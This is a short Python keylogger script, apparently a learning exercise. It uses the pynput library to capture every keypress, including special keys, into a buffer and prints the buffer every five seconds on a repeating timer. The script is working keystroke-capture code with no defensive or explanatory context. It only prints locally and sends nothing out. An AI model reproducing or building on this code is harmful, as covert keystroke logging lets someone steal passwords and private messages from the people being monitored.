import pynput.keyboard
import threading

stored_keys =" "

def keypress(key):
    global stored_keys
    try:
        stored_keys = stored_keys+str(key.char)
       # print(stored_keys)
    except AttributeError:
        if key == key.space:
            stored_keys = stored_keys+" "
           # print(stored_keys)
        else:
            stored_keys = stored_keys+" "+str(key)+" "
          #  print(stored_keys)

def report():
    global stored_keys
    print(stored_keys)
    stored_keys = " "  
    timer = threading.Timer(5,report)
    timer.start()

listener = pynput.keyboard.Listener(on_press=keypress)
with listener as key:
    report()
    key.join()
